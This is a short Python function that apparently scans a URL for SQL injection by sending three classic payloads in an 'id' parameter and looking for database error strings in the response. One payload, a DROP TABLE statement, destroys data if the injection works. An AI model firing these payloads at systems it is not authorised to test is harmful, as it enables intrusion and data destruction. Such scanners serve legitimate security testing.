import requests

def test_sql_injection(target_url):
    vulnerabilities = []
    payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "\" OR \"1\"=\"1"]
    for payload in payloads:
        params = {'id': payload}
        try:
            response = requests.get(target_url, params=params, timeout=5)
            if ("SQL syntax" in response.text or
                "mysql_fetch" in response.text or
                "ORA-" in response.text):
                vulnerabilities.append({
                    'payload': payload,
                    'evidence': 'SQL error message found in response.'
                })
        except Exception as e:
            vulnerabilities.append({
                'payload': payload,
                'error': str(e)
            })
    return vulnerabilities if vulnerabilities else "No SQL Injection vulnerability detected."
